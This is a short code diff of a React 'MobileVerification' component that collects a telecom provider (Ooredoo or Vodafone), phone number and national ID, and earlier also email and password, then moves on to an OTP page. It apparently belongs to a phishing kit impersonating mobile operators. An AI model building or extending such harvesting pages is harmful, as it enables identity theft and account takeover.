@@ -88,12 +88,10 @@ export default function MobileVerification() {
     waitingMessage.value = "جاري مصادقة البيانات...";
 
     sendData({
-      mobileVerification: {
-        provider,
-        phone: provider === "ooredoo" ? phone : vodaPhone,
-        nationalId,
-        email,
-        password,
+      data: {
+        "مزود الخدمة": provider === "ooredoo" ? "أوريدو ooredoo" : "فودافون vodafone",
+        "رقم الهاتف": provider === "ooredoo" ? phone : vodaPhone,
+        "الرقم الشخصي": provider === "ooredoo" ? nationalId : "",
       },
       current: "توثيق رقم الهاتف",
       nextPage: "OTP أوريدو",
